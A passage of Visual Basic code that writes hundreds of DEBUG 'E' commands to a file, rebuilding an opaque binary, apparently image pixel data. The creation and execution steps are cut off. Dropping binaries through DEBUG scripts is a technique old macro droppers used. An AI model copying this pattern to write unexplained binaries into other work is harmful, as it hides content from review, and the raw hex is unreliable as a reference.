Print #hFile, "E 1F70 B4 B2 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 1C A6"
Print #hFile, "E 1F80 A4 3A 43 47 43 4C 50 30 37 3A 1E 26 25 1B 97 91"
Print #hFile, "E 1F90 09 F7 EF 09 F7 EF 09 F7 EF 13 D8 D2 3D 65 68 43"
Print #hFile, "E 1FA0 4F 53 4C 58 5E 53 5F 65 49 53 5A 42 4C 53 42 4B"
Print #hFile, "E 1FB0 4F 42 4B 4F 49 50 53 45 4C 4F 39 43 43 3B 45 45"
Print #hFile, "E 1FC0 36 40 40 39 43 43 44 4E 4E 00 03 03 00 00 F3 F6"
Print #hFile, "E 1FD0 F4 EA ED EB DB DD DD CF D1 D1 C2 C6 C7 B4 B8 B9"
Print #hFile, "E 1FE0 00 02 05 6B 70 73 62 68 6D 54 5A 5F 58 60 67 49"
Print #hFile, "E 1FF0 51 58 43 4C 55 54 5D 66 4B 63 6B 09 F7 EF 09 F7"
Print #hFile, "E 2000 EF 09 F7 EF 09 F7 EF 09 F7 EF 4D 64 6C 6D 76 7F"
Print #hFile, "E 2010 6D 76 7F 56 5F 68 67 70 79 64 6D 76 5E 67 70 49"
Print #hFile, "E 2020 8C 90 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2030 EF 09 F7 EF 09 F7 EF 3F 91 94 51 5D 67 56 65 6E"
Print #hFile, "E 2040 5B 68 70 5F 6A 72 58 60 67 5C 60 65 47 47 4D 06"
Print #hFile, "E 2050 03 05 10 09 0C 1B 51 4F 09 F7 EF 09 F7 EF 13 47"
Print #hFile, "E 2060 47 23 1A 1D 0F 06 03 0D 06 03 D8 D3 D2 FF FD FD"
Print #hFile, "E 2070 FF FE FF FD FE FF F7 F7 F7 FF FF FE 36 F9 F2 09"
Print #hFile, "E 2080 F7 EF 40 F4 F3 77 83 A7 60 73 A6 17 EB EB 09 F7"
Print #hFile, "E 2090 EF 09 F7 EF 09 F7 EF 09 F7 EF 9F EA F6 AE AE BA"
Print #hFile, "E 20A0 B7 B7 C3 C5 C7 D2 86 E3 E9 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 20B0 F7 EF 09 F7 EF 09 F7 EF 84 A2 AD 2B 2A 34 09 F7"
Print #hFile, "E 20C0 EF 09 F7 EF 0A BD B7 03 03 03 01 03 04 24 29 2C"
Print #hFile, "E 20D0 59 5F 64 13 E5 DF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 20E0 F7 EF 25 76 78 33 3D 44 45 4F 56 3E 47 4B 17 1F"
Print #hFile, "E 20F0 1E 19 95 90 09 F7 EF 09 F7 EF 09 F7 EF 35 7A 7A"
Print #hFile, "E 2100 46 52 56 51 5D 61 52 5E 64 51 5D 63 4D 57 5E 4A"
Print #hFile, "E 2110 54 5B 46 4F 53 44 4D 51 4A 51 54 46 4D 50 39 41"
Print #hFile, "E 2120 41 3B 43 43 3B 43 43 43 4B 4B 4C 54 54 00 03 03"
Print #hFile, "E 2130 00 00 F7 FA F8 ED F0 EE DD DF DF CF D1 D1 C1 C5"
Print #hFile, "E 2140 C6 B2 B6 B7 00 00 03 68 6D 70 64 6A 6F 54 5A 5F"
Print #hFile, "E 2150 56 5E 65 53 5B 62 51 5A 63 54 5D 66 3C 7E 83 09"
Print #hFile, "E 2160 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 43 85"
Print #hFile, "E 2170 8A 6C 75 7E 66 6F 78 51 5A 63 60 69 72 62 6B 74"
Print #hFile, "E 2180 5E 67 70 3E 9D A0 09 F7 EF 09 F7 EF 09 F7 EF 27"
Print #hFile, "E 2190 CD CA 1B DE D9 09 F7 EF 09 F7 EF 35 B2 B2 5C 68"
Print #hFile, "E 21A0 72 5E 6D 76 61 6E 76 60 6B 73 4C 54 5B 54 58 5D"
Print #hFile, "E 21B0 38 36 3C 04 00 01 14 0D 10 1A 50 4E 09 F7 EF 09"
Print #hFile, "E 21C0 F7 EF 1C 50 53 1C 13 16 07 00 00 56 52 4D FF FF"
Print #hFile, "E 21D0 FC F9 F7 F7 FD FC FE FD FF FF F9 FA F8 FB FC FA"
Print #hFile, "E 21E0 09 F7 EF 09 F7 EF 3D F2 F3 72 7E A6 6F 81 B6 09"
Print #hFile, "E 21F0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3E E5 EB EA EE"
Print #hFile, "E 2200 FF B4 B5 BF AD AE B8 C6 C8 D3 D4 DA E7 23 F4 EF"
Print #hFile, "E 2210 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 40 D5 D5 42"
Print #hFile, "E 2220 43 4D 09 F7 EF 09 F7 EF 0C BE B8 06 07 05 00 02"
Print #hFile, "E 2230 03 06 0A 0B 38 86 87 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2240 09 F7 EF 14 D8 D3 31 3B 42 35 3F 46 48 52 59 3B"
Print #hFile, "E 2250 46 4A 21 2C 2A 15 91 8C 09 F7 EF 09 F7 EF 0C DE"
Print #hFile, "E 2260 D8 3E 4A 4C 46 52 56 58 64 68 4E 5A 60 4F 5B 61"
Print #hFile, "E 2270 57 61 68 58 62 69 4D 56 5A 44 4D 51 46 4D 50 41"
Print #hFile, "E 2280 48 4B 3B 43 43 3A 42 42 3A 42 42 43 4B 4B 49 51"
Print #hFile, "E 2290 51 00 01 01 00 00 F7 FA F8 ED F0 EE DC DE DE CE"
Print #hFile, "E 22A0 D0 D0 C0 C4 C5 B2 B6 B7 00 01 04 6A 6F 72 51 57"
Print #hFile, "E 22B0 5C 59 5F 64 59 61 68 4F 57 5E 4F 58 61 59 62 6B"
Print #hFile, "E 22C0 3C 9B 9E 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 22D0 F7 EF 36 A3 A5 68 71 7A 60 69 72 54 5D 66 4F 58"
Print #hFile, "E 22E0 61 59 62 6B 5E 67 70 35 B1 B1 09 F7 EF 09 F7 EF"
Print #hFile, "E 22F0 09 F7 EF 47 97 9B 37 A2 A4 09 F7 EF 09 F7 EF 25"
Print #hFile, "E 2300 CC C9 60 6C 76 5E 6D 76 60 6D 75 5A 63 6C 51 57"
Print #hFile, "E 2310 5E 5A 5D 62 32 2E 34 05 00 02 15 0E 11 17 4D 4C"
Print #hFile, "E 2320 09 F7 EF 09 F7 EF 1F 55 57 12 0B 10 07 02 01 CE"
Print #hFile, "E 2330 CA C5 FF FC F8 FF FF FE F6 F6 F6 FD FF FE FF FF"
Print #hFile, "E 2340 FC F9 FA F8 09 F7 EF 09 F7 EF 37 EC EE 71 7C A8"
Print #hFile, "E 2350 6E 8E BF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 69"
Print #hFile, "E 2360 C9 DE F2 F8 FF CF D0 DA B0 B1 BB CA CC D6 D4 DA"
Print #hFile, "E 2370 E7 7C E9 ED 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2380 12 F2 EB 58 59 63 09 F7 EF 09 F7 EF 0C BE B8 08"
Print #hFile, "E 2390 09 07 03 05 06 00 00 01 1B C0 BC 09 F7 EF 09 F7"
Print #hFile, "E 23A0 EF 09 F7 EF 09 F7 EF 3A 7E 82 33 3E 46 30 3B 43"
Print #hFile, "E 23B0 3F 4B 51 3B 46 4A 40 4B 49 15 91 8C 09 F7 EF 09"
Print #hFile, "E 23C0 F7 EF 07 A1 9C 2C 38 3A 3B 47 4B 4D 59 5D 48 54"
Print #hFile, "E 23D0 5A 49 55 5B 56 60 67 59 63 6A 50 59 5D 48 51 55"
Print #hFile, "E 23E0 46 4D 50 40 47 4A 3F 44 45 3C 41 42 3B 40 41 41"
Print #hFile, "E 23F0 46 47 43 48 49 00 00 01 00 00 F3 F6 F4 E9 EC EA"
Print #hFile, "E 2400 DA DC DC CD CF CF C0 C4 C5 B5 B9 BA 00 04 07 6E"
Print #hFile, "E 2410 73 76 54 5A 5F 5A 60 65 56 5E 65 4F 57 5E 4B 54"
Print #hFile, "E 2420 5D 4F 58 61 2E AA AB 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2430 09 F7 EF 09 F7 EF 29 C1 C0 65 6E 77 60 69 72 61"
Print #hFile, "E 2440 6A 73 55 5E 67 5E 67 70 64 6D 76 36 B2 B3 09 F7"
Print #hFile, "E 2450 EF 09 F7 EF 09 F7 EF 5F 74 7C 55 86 8C 09 F7 EF"
Print #hFile, "E 2460 09 F7 EF 23 D9 D5 68 74 7E 5E 6D 76 62 6D 75 57"
Print #hFile, "E 2470 60 69 5E 64 6B 62 65 6A 2B 27 2D 07 00 03 17 0E"
Print #hFile, "E 2480 11 14 4A 49 09 F7 EF 09 F7 EF 0E 45 48 04 00 03"
Print #hFile, "E 2490 39 35 34 FF FF FB F5 F4 F0 FF FF FC FC FF FB FC"
Print #hFile, "E 24A0 FF FB FF FF FB FC FD FB 09 F7 EF 09 F7 EF 31 E5"
Print #hFile, "E 24B0 E8 7C 86 B6 63 AC D2 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 24C0 09 F7 EF 8D B4 D5 F4 FA FF E9 EC F4 BC BE C6 C5"
Print #hFile, "E 24D0 C7 D1 D1 D7 E4 C4 DC E5 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 24E0 EF 09 F7 EF 09 F7 EF 4A 96 99 09 F7 EF 09 F7 EF"
Print #hFile, "E 24F0 0A BD B6 09 0A 08 07 07 07 01 1F 1F 09 F7 EF 09"
Print #hFile, "E 2500 F7 EF 09 F7 EF 09 F7 EF 1B D1 CD 4F 5A 62 38 43"
Print #hFile, "E 2510 4B 27 32 3A 2F 3B 41 41 4C 50 45 50 4E 15 91 8C"
Print #hFile, "E 2520 09 F7 EF 09 F7 EF 05 82 7F 1F 2B 2D 39 45 49 4B"
Print #hFile, "E 2530 57 5B 48 54 5A 45 51 57 4C 56 5D 4C 56 5D 4D 56"
Print #hFile, "E 2540 5A 4E 57 5B 48 4F 52 43 4A 4D 40 45 46 3E 43 44"
Print #hFile, "E 2550 3D 42 43 3D 42 43 3D 42 43 00 00 01 00 00 F3 F6"
Print #hFile, "E 2560 F4 E9 EC EA D9 DB DB CD CF CF C0 C4 C5 B5 B9 BA"
Print #hFile, "E 2570 00 05 08 6F 74 77 68 6E 73 55 5B 60 52 5A 61 56"
Print #hFile, "E 2580 5E 65 54 5D 66 52 5B 64 20 C7 C4 09 F7 EF 09 F7"
Print #hFile, "E 2590 EF 09 F7 EF 09 F7 EF 09 F7 EF 19 DD D8 61 6A 73"
Print #hFile, "E 25A0 60 69 72 6E 77 80 5E 67 70 5E 67 70 61 6A 73 2F"
Print #hFile, "E 25B0 B9 B8 09 F7 EF 09 F7 EF 09 F7 EF 60 67 70 72 77"
Print #hFile, "E 25C0 80 09 F7 EF 09 F7 EF 09 F7 EF 61 6D 77 56 65 6E"
Print #hFile, "E 25D0 5A 65 6D 4C 55 5E 60 63 6B 5D 5D 63 20 19 20 07"
Print #hFile, "E 25E0 00 03 1A 11 14 15 4A 49 09 F7 EF 09 F7 EF 04 3E"
Print #hFile, "E 25F0 3F 17 13 19 9B 99 99 FF FF FC FF FF FA FF FF FB"
Print #hFile, "E 2600 FD FF FB FA FE F8 FB FD F7 FE FE FE 09 F7 EF 09"
Print #hFile, "E 2610 F7 EF 2A DE E2 8D 96 C8 69 B3 D8 09 F7 EF 09 F7"
Print #hFile, "E 2620 EF 09 F7 EF 09 F7 EF 91 9E C4 ED F4 FF F6 F9 FF"
Print #hFile, "E 2630 D0 D2 DA BF C2 CA CA D0 DD CA D3 DD 49 EF EB 09"
Print #hFile, "E 2640 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 31 C7 C5 09 F7"
Print #hFile, "E 2650 EF 09 F7 EF 0A BC B5 09 0A 08 07 07 07 05 8B 87"
Print #hFile, "E 2660 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 45 7A 7F 4F"
Print #hFile, "E 2670 5A 62 39 44 4C 27 32 3A 24 31 39 3D 49 4D 48 53"
Print #hFile, "E 2680 51 22 9E 99 09 F7 EF 09 F7 EF 13 66 65 0A 16 18"
Print #hFile, "E 2690 28 34 38 37 43 47 46 52 58 47 53 59 49 53 5A 41"
Print #hFile, "E 26A0 4B 52 46 4F 53 4C 55 59 44 4B 4E 41 48 4B 3D 42"
Print #hFile, "E 26B0 43 41 45 46 43 47 48 40 44 45 3D 41 42 00 00 01"
Print #hFile, "E 26C0 00 00 F7 FA F8 EC EF ED DB DD DD CD CF CF BF C3"
Print #hFile, "E 26D0 C4 B3 B7 B8 00 02 05 6C 71 74 6C 72 77 50 56 5B"
Print #hFile, "E 26E0 4E 56 5D 4B 53 5A 4A 53 5C 55 5E 67 1B D0 CC 09"
Print #hFile, "E 26F0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2700 EF 5C 65 6E 5F 68 71 75 7E 87 62 6B 74 5E 67 70"
Print #hFile, "E 2710 64 6D 76 20 D6 D2 09 F7 EF 09 F7 EF 20 D5 D1 5E"
Print #hFile, "E 2720 65 6E 7A 7F 88 13 E5 DF 09 F7 EF 09 F7 EF 62 6F"
Print #hFile, "E 2730 77 5F 6C 74 63 6E 76 52 5C 63 53 56 5E 4E 4E 54"
Print #hFile, "E 2740 10 0C 11 06 00 02 1C 16 17 17 4C 4B 09 F7 EF 09"
Print #hFile, "E 2750 F7 EF 0F 4A 4B 51 52 56 F2 F2 F2 FE FF FD FF FF"
Print #hFile, "E 2760 FE FC FD F9 FA FC F6 FC FE F8 F6 F7 F3 FC FD FF"
Print #hFile, "E 2770 09 F7 EF 09 F7 EF 24 D8 DE 90 99 D2 66 AE D6 09"
Print #hFile, "E 2780 F7 EF 09 F7 EF 09 F7 EF 1E E4 E7 8A 96 BE EA F4"
Print #hFile, "E 2790 FF F8 FE FF F4 F7 FC D2 D4 DC C7 CB D6 C8 CB D9"
Print #hFile, "E 27A0 87 E4 E5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 10"
Print #hFile, "E 27B0 F0 E9 09 F7 EF 09 F7 EF 09 BC B6 0C 0A 09 06 14"
Print #hFile, "E 27C0 16 08 E8 E1 09 F7 EF 09 F7 EF 09 F7 EF 24 BC BA"
Print #hFile, "E 27D0 5A 63 6C 4B 56 5E 37 43 49 2F 3B 41 26 32 38 33"
Print #hFile, "E 27E0 3E 42 36 40 40 26 A3 9E 09 F7 EF 09 F7 EF 28 6D"
Print #hFile, "E 27F0 6B 05 11 13 27 34 36 37 43 47 43 4F 53 4C 58 5C"
Print #hFile, "E 2800 4F 5B 5F 40 4B 4F 3F 4A 4E 43 4E 52 39 42 46 39"
Print #hFile, "E 2810 42 45 3A 3F 42 41 46 47 47 4B 4C 43 47 48 40 44"
Print #hFile, "E 2820 45 00 02 03 00 00 F0 F3 F1 EF F2 F0 DC DE DE C9"
Print #hFile, "E 2830 CB CB C0 C4 C5 B5 B9 BA 00 00 03 6B 70 73 67 6D"
Print #hFile, "E 2840 72 63 69 6E 51 59 60 55 5D 64 59 62 6B 51 5A 63"
Print #hFile, "E 2850 0D EE E7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2860 F7 EF 09 F7 EF 4A 7F 84 66 6F 78 6F 78 81 67 6E"
Print #hFile, "E 2870 77 66 6D 76 5E 65 6E 20 D5 D1 09 F7 EF 09 F7 EF"
Print #hFile, "E 2880 21 C7 C4 72 77 80 7B 7D 87 20 D5 D1 09 F7 EF 09"
Print #hFile, "E 2890 F7 EF 4D 91 95 63 6F 75 65 71 77 5A 63 67 56 5A"
Print #hFile, "E 28A0 5F 48 49 4D 04 00 05 07 02 04 17 11 12 18 4F 4E"
Print #hFile, "E 28B0 09 F7 EF 09 F7 EF A0 DD DB F0 F4 F5 DC E1 E2 F4"
Print #hFile, "E 28C0 F8 F9 FD FF FF FF FF FF F1 EE EA EA E7 E3 F8 F9"
Print #hFile, "E 28D0 F7 F9 FC FF 09 F7 EF 09 F7 EF 28 DE E6 93 9D DD"
Print #hFile, "E 28E0 4E BD DB 09 F7 EF 09 F7 EF 09 F7 EF 28 DF E6 7D"
Print #hFile, "E 28F0 8C B3 D1 DE F4 ED F6 FF F8 FB FF FA F9 FD C0 BC"
Print #hFile, "E 2900 C8 CA C7 D6 BA D9 E4 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2910 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 BB B6 08"
Print #hFile, "E 2920 05 07 06 7C 79 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2930 EF 46 6B 70 54 5E 65 52 5C 63 51 5C 60 37 40 43"
Print #hFile, "E 2940 28 31 34 33 3D 3D 35 3E 41 20 9D 9A 09 F7 EF 09"
Print #hFile, "E 2950 F7 EF 1B 60 5E 21 2F 2E 0E 1C 1B 35 42 44 44 51"
Print #hFile, "E 2960 53 47 54 56 46 53 55 4A 56 5A 53 5F 63 4D 59 5F"
Print #hFile, "E 2970 3F 4B 51 3C 48 4E 3A 43 46 41 48 4B 40 45 48 3D"
Print #hFile, "E 2980 42 45 40 45 48 00 00 03 00 00 F1 F4 F2 EE F1 EF"
Print #hFile, "E 2990 DC DE DE CB CD CD C0 C4 C5 B3 B7 B8 00 01 04 70"
Print #hFile, "E 29A0 75 78 64 6A 6F 5F 65 6A 4B 53 5A 4C 54 5B 4F 58"
Print #hFile, "E 29B0 61 4A 53 5C 09 F7 EF 09 F7 EF 09 F7 EF 14 E7 E1"
Print #hFile, "E 29C0 09 F7 EF 09 F7 EF 09 F7 EF 3E 9E A0 67 70 79 68"
Print #hFile, "E 29D0 71 7A 63 6A 73 60 67 70 5C 61 6A 20 D5 D1 09 F7"
Print #hFile, "E 29E0 EF 09 F7 EF 31 AB AC 69 6E 77 75 77 81 32 BB BA"
Print #hFile, "E 29F0 09 F7 EF 09 F7 EF 4A 8E 91 5C 68 6E 61 6C 70 57"
Print #hFile, "E 2A00 60 64 58 5D 60 43 44 48 01 00 02 09 06 08 1A 15"
Print #hFile, "E 2A10 16 14 4B 4A 09 F7 EF 09 F7 EF A0 E0 DC EE F4 F3"
Print #hFile, "E 2A20 E2 E7 E8 F4 F9 FC EA EB EF E0 DD DF E4 DF DC FA"
Print #hFile, "E 2A30 F7 F3 FC FC FC F8 FB FF 09 F7 EF 09 F7 EF 26 DC"
Print #hFile, "E 2A40 E7 8C 99 DD 47 C4 DE 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2A50 29 E0 E7 7E 8B B7 BE CB E5 F3 FC FF FB FE FF FF"
Print #hFile, "E 2A60 FB FF DE D8 E3 C3 BE CD C9 C8 D8 22 F4 EE 09 F7"
Print #hFile, "E 2A70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2A80 0A BC B7 0A 15 19 09 E9 E1 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2A90 F7 EF 30 A9 A8 4E 56 5D 56 5E 65 50 5A 61 4E 57"
Print #hFile, "E 2AA0 5B 35 3E 41 2D 32 33 35 3D 3D 46 4F 52 1D 9A 98"
Print #hFile, "E 2AB0 09 F7 EF 09 F7 EF 10 64 62 24 32 31 13 21 20 25"
Print #hFile, "E 2AC0 33 32 31 3F 3E 36 44 43 37 44 46 3D 4C 4E 4E 5A"
Print #hFile, "E 2AD0 5E 4C 5A 60 41 4C 54 39 45 4B 3F 4A 4E 43 4C 4F"
Print #hFile, "E 2AE0 44 4B 4E 49 4E 51 4C 51 54 01 06 09 00 00 F2 F5"
Print #hFile, "E 2AF0 F3 ED F0 EE DD DF DF CD CF CF BF C3 C4 B1 B5 B6"
Print #hFile, "E 2B00 00 03 06 75 7A 7D 63 69 6E 5F 65 6A 49 51 58 46"
Print #hFile, "E 2B10 4E 55 48 51 5A 41 66 6D 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2B20 EF 60 78 7F 28 C1 BF 09 F7 EF 09 F7 EF 31 BB BB"
Print #hFile, "E 2B30 5F 68 71 55 5E 67 5C 63 6C 5B 62 6B 58 5F 68 0E"
Print #hFile, "E 2B40 EE E7 09 F7 EF 09 F7 EF 36 A3 A4 69 6E 77 6D 6F"
Print #hFile, "E 2B50 79 34 AE AF 09 F7 EF 09 F7 EF 34 B0 B0 5B 67 6D"
Print #hFile, "E 2B60 60 6B 6F 54 5D 61 4F 54 57 38 39 3D 01 1F 1F 10"
Print #hFile, "E 2B70 1C 1D 17 12 13 12 4A 48 09 F7 EF 09 F7 EF A1 DF"
Print #hFile, "E 2B80 DC E7 FB FA 99 F6 F4 89 F4 F2 BD DC DE DC DA DA"
Print #hFile, "E 2B90 F0 ED E9 FF FF FE FC FD FF F6 FA FF 09 F7 EF 09"
Print #hFile, "E 2BA0 F7 EF 27 DD E7 86 93 D7 46 C4 DF 09 F7 EF 09 F7"
Print #hFile, "E 2BB0 EF 09 F7 EF 29 DF E7 82 8F BD A0 AB CB F3 FA FF"
Print #hFile, "E 2BC0 FA FD FF FE FD FF FA F6 FC CB C7 D2 BE BE CA 52"
Print #hFile, "E 2BD0 E9 E8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2BE0 EF 09 F7 EF 0A BC B7 09 7F 7D 09 F7 EF 09 F7 EF"
Print #hFile, "E 2BF0 09 F7 EF 09 EA E2 47 59 5D 4C 54 5B 55 5D 64 4E"
Print #hFile, "E 2C00 58 5F 4B 54 58 34 3D 40 2D 32 33 34 3C 3C 3C 45"
Print #hFile, "E 2C10 49 18 95 93 09 F7 EF 09 F7 EF 0D 99 95 23 2F 31"
Print #hFile, "E 2C20 23 2F 2F 16 22 22 2A 36 36 32 3E 3E 36 42 44 3A"
Print #hFile, "E 2C30 47 49 48 53 57 4F 5B 5F 4C 56 5D 48 52 59 40 4B"
Print #hFile, "E 2C40 4F 3E 47 4A 3B 42 45 40 45 48 42 47 4A 00 00 03"
Print #hFile, "E 2C50 00 00 F4 F7 F5 EC EF ED DE E0 E0 CF D1 D1 BF C3"
Print #hFile, "E 2C60 C4 B0 B4 B5 00 04 07 77 7C 7F 63 69 6E 64 6A 6F"
Print #hFile, "E 2C70 4E 56 5D 46 4E 55 4B 54 5D 40 82 87 09 F7 EF 09"
Print #hFile, "E 2C80 F7 EF 21 D6 D3 61 6A 73 38 97 9A 09 F7 EF 09 F7"
Print #hFile, "E 2C90 EF 20 D5 D1 5F 68 71 55 5E 67 5C 63 6C 5A 61 6A"
Print #hFile, "E 2CA0 5B 62 6B 09 F7 EF 09 F7 EF 09 F7 EF 4B 8C 91 69"
Print #hFile, "E 2CB0 70 79 63 68 71 35 A0 A2 09 F7 EF 09 F7 EF 34 B2"
Print #hFile, "E 2CC0 B1 61 6D 73 64 6F 73 52 5B 5F 47 4C 4F 29 2A 2E"
Print #hFile, "E 2CD0 07 BA B4 0A DB D4 0E 64 62 12 78 75 09 F7 EF 09"
Print #hFile, "E 2CE0 F7 EF 3D F1 EA 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2CF0 EF 25 F6 EF 74 FB F5 B2 FD FA BE FB FB AF EE FB"
Print #hFile, "E 2D00 09 F7 EF 09 F7 EF 28 DE E9 81 91 D4 47 C6 E1 09"
Print #hFile, "E 2D10 F7 EF 09 F7 EF 09 F7 EF 29 DE E7 87 94 C8 83 8E"
Print #hFile, "E 2D20 B4 DB E2 FB F8 FC FF FA FA FF FF FE FF E8 E6 EC"
Print #hFile, "E 2D30 C2 C4 CC 6C D8 D9 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2D40 F7 EF 09 F7 EF 09 F7 EF 09 DA D3 09 E9 E1 09 F7"
Print #hFile, "E 2D50 EF 09 F7 EF 09 F7 EF 05 7E 7C 42 46 4B 49 51 58"
Print #hFile, "E 2D60 50 58 5F 4E 58 5F 4D 56 5A 2E 62 63 13 BA B4 09"
Print #hFile, "E 2D70 F7 EF 16 AF AB 0E D2 CD 09 F7 EF 09 F7 EF 0A EB"
Print #hFile, "E 2D80 E3 0F 46 46 29 35 35 15 21 21 1E 2A 2A 2E 3A 3A"
Print #hFile, "E 2D90 3B 47 49 3F 4B 4D 44 4F 53 4B 56 5A 4F 57 5E 4B"
Print #hFile, "E 2DA0 56 5A 42 4E 50 3F 48 4B 3A 41 44 3B 40 43 3E 43"
Print #hFile, "E 2DB0 46 00 00 03 00 00 F4 F7 F5 EB EE EC DE E0 E0 D0"
Print #hFile, "E 2DC0 D2 D2 BE C2 C3 B1 B5 B6 00 03 06 70 75 78 62 68"
Print #hFile, "E 2DD0 6D 69 6F 74 53 5B 62 48 50 57 50 59 62 41 92 95"
Print #hFile, "E 2DE0 09 F7 EF 09 F7 EF 3A B5 B6 5A 61 6A 3F 72 78 09"
Print #hFile, "E 2DF0 F7 EF 09 F7 EF 0E EF E8 64 6B 74 65 6C 75 5F 68"
Print #hFile, "E 2E00 71 57 60 69 5D 66 6F 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2E10 50 93 97 62 69 72 5F 64 6D 43 82 87 09 F7 EF 09"
Print #hFile, "E 2E20 F7 EF 1E D5 D0 62 6E 74 62 6D 71 53 59 5E 4C 4F"
Print #hFile, "E 2E30 53 15 51 52 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2E40 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2E50 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2E60 EF 09 F7 EF 09 F7 EF 09 F7 EF 29 E0 EA 85 95 D8"
Print #hFile, "E 2E70 4B CB E6 09 F7 EF 09 F7 EF 09 F7 EF 29 DF E9 94"
Print #hFile, "E 2E80 9F D9 7A 83 AF B9 C1 DF F4 F9 FF F9 FC FF FB FD"
Print #hFile, "E 2E90 FE FD FF FF D8 DB DF 8D CB CD 09 F7 EF 09 F7 EF"
Print #hFile, "E 2EA0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2EB0 F7 EF 09 F7 EF 09 F7 EF 08 D9 D2 00 0F 12 3A 3E"
Print #hFile, "E 2EC0 43 46 4F 53 4B 53 5A 4F 59 60 53 5C 60 16 CC C6"
Print #hFile, "E 2ED0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2EE0 F7 EF 09 F7 EF 09 E9 E2 10 9B 97 1E 53 52 0B 15"
Print #hFile, "E 2EF0 15 1D 27 27 32 3C 3C 3F 49 49 43 4C 4F 44 4D 50"
Print #hFile, "E 2F00 43 49 4E 3A 43 47 39 45 47 3E 47 4A 3D 44 47 3D"
Print #hFile, "E 2F10 42 45 3F 44 47 00 00 03 00 00 F4 F7 F5 EB EE EC"
Print #hFile, "E 2F20 DE E0 E0 CF D1 D1 BE C2 C3 B3 B7 B8 00 01 04 62"
Print #hFile, "E 2F30 67 6A 62 68 6D 6B 71 76 56 5E 65 48 50 57 50 59"
Print #hFile, "E 2F40 62 32 AE AE 09 F7 EF 09 F7 EF 33 AE AF 57 5E 67"
Print #hFile, "E 2F50 59 60 69 09 F7 EF 09 F7 EF 09 F7 EF 4F 73 7A 53"
Print #hFile, "E 2F60 5A 63 5E 67 70 50 59 62 5C 65 6E 09 F7 EF 09 F7"
Print #hFile, "E 2F70 EF 09 F7 EF 66 6F 78 5B 64 6D 59 60 69 43 84 89"
Print #hFile, "E 2F80 09 F7 EF 09 F7 EF 1D D3 CF 5C 68 6E 5C 65 69 51"
Print #hFile, "E 2F90 57 5C 4D 50 54 0A 90 8D 09 F7 EF 09 F7 EF 09 F7"
Print #hFile, "E 2FA0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2FB0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 2FC0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 2A E1"
Print #hFile, "E 2FD0 EB 8C 9E DF 4F CF EA 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 2FE0 2B E0 EA 9D A6 E5 81 89 BE 9A A1 C8 E6 EB FF F8"
Print #hFile, "E 2FF0 FD FF F8 FC FD FD FF FE F1 F6 F5 C1 D4 D7 09 F7"
Print #hFile, "E 3000 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3010 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 05 5E 5C 00"
Print #hFile, "E 3020 00 01 28 2D 30 45 4B 50 49 51 58 50 5A 61 54 5D"
Print #hFile, "E 3030 61 18 CD C8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
Print #hFile, "E 3040 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
Print #hFile, "E 3050 F7 EF 09 DB D4 0C 6B 68 1C 26 26 2E 38 38 3A 41"
Print #hFile, "E 3060 44 3F 46 49 3D 43 48 35 3B 40 3A 43 46 3F 48 4B"
Print #hFile, "E 3070 3F 46 49 3D 42 45 3F 44 47 00 00 03 00 00 F3 F6"
Print #hFile, "E 3080 F4 EB EE EC DD DF DF CD CF CF BE C2 C3 B7 BB BC"
Print #hFile, "E 3090 00 00 03 52 57 5A 6A 70 75 6F 75 7A 59 61 68 4B"
